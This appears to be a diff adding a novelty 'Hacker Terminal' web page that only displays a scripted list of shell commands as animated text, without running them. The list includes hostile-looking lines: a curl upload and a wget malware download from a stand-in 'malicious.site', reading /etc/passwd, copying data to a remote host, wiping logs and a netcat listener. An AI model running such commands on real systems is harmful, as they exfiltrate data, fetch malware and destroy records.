@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Terminal</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: rgb(30, 30, 30);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        header {
+            width: 100%;
+            color: rgb(164, 164, 164);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            height: 12vh;
+            box-sizing: border-box;
+            padding: 10px;
+        }
+
+        header .text {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+
+        .button-container {
+            margin-top: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .hack-button {
+            background-color: #00ff00;
+            color: black;
+            font-size: 1rem;
+            font-family: 'Courier New', Courier, monospace;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .hack-button:hover {
+            background-color: #00cc00;
+        }
+
+        .terminal {
+            width: 80vw;
+            height: calc(100vh - 12vh - 30px);
+            border-radius: 17px;
+            background-color: rgb(16, 16, 16);
+            box-shadow: rgb(78, 78, 78) 10px 10px 20px;
+            color: green;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1rem;
+            overflow-y: auto;
+            margin-top: 10px;
+            padding: 10px;
+        }
+
+        .terminal p {
+            margin: 0;
+            padding: 5px 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <div class="text">>_ H A C K E R</div>
+        </header>
+        <div class="button-container">
+            <button class="hack-button" onclick="startFastHack()">click</button>
+        </div>
+        <div class="terminal"></div>
+    </div>
+    <script>
+        const fastMessages = [
+            "Initializing Hacking...",
+            "mkdir /tmp/hack && cd /tmp/hack",
+            "echo 'import os; os.system(\"/bin/bash\")' > exploit.py",
+            "python3 exploit.py",
+            "cat /etc/passwd",
+            "scp /tmp/hack.tar.gz hacker@remote:/hack_data",
+            "rm -rf /tmp/hack",
+            "iptables -A INPUT -j ACCEPT",
+            "openssl enc -aes-256-cbc -salt -in data.txt -out encrypted.txt -k PASSWORD",
+            "curl -X POST -d @data.json http://malicious.site/upload",
+            "rm -rf /var/log/*",
+            "shutdown -h now",
+            "exit",
+            "nmap -sP 192.168.1.0/24",
+            "nc -lvp 4444",
+            "sudo apt-get update",
+            "sudo apt-get install nmap",
+            "nmap -sV 192.168.1.1",
+            "ssh-keygen -t rsa -b 4096",
+            "ssh-copy-id user@192.168.1.1",
+            "ssh user@192.168.1.1",
+            "cd /var/www/html",
+            "git clone https://github.com/example/repo.git",
+            "cd repo",
+            "npm install",
+            "npm start",
+            "wget http://malicious.site/malware.sh",
+            "chmod +x malware.sh",
+            "./malware.sh",
+            "ps aux | grep malware",
+            "kill -9 1234",
+            "echo 'Hacked!'",
+            "rm -rf /tmp/hack",
+            "systemctl restart apache2",
+            "tail -f /var/log/syslog",
+            "ping -c 4 google.com",
+            "traceroute google.com",
+            "ifconfig",
+            "netstat -tuln",
+            "df -h",
+            "du -sh /home/user",
+            "top -n 1",
+            "ps -ef",
+            "ls -lah",
+            "chmod 777 /var/www/html",
+            "chown www-data:www-data /var/www/html",
+            "usermod -aG sudo user",
+            "passwd user",
+            "iptables -L",
+            "ufw status",
+            "service --status-all",
+            "systemctl list-units --type=service",
+            "journalctl -xe",
+            "htop",
+            "whoami",
+            "hostnamectl",
+            "uname -a",
+            "lsb_release -a",
+            "cat /proc/cpuinfo",
+            "cat /proc/meminfo",
+            "dmesg | tail",
+            "echo 'Hack complete!'"
+        ];
+
+        function getRandDelay() {
+            const delays = [50, 100, 150, 180];
+            return delays[Math.floor(Math.random() * delays.length)];
+        }
+
+        async function startFastHack() {
+            const terminal = document.querySelector(".terminal");
+            terminal.innerHTML = ''; // Clear previous content
+            document.querySelector(".button-container").style.display = 'none'; // Hide button
+
+            for (const message of fastMessages) {
+                const p = document.createElement("p");
+                p.textContent = message;
+                terminal.appendChild(p);
+                terminal.scrollTop = terminal.scrollHeight; // Auto-scroll
+                terminal.style.scrollbarWidth =  "none";
+                await new Promise(resolve => setTimeout(resolve, getRandDelay()));
+            }
+        }
+    </script>
+</body>
+
+</html>
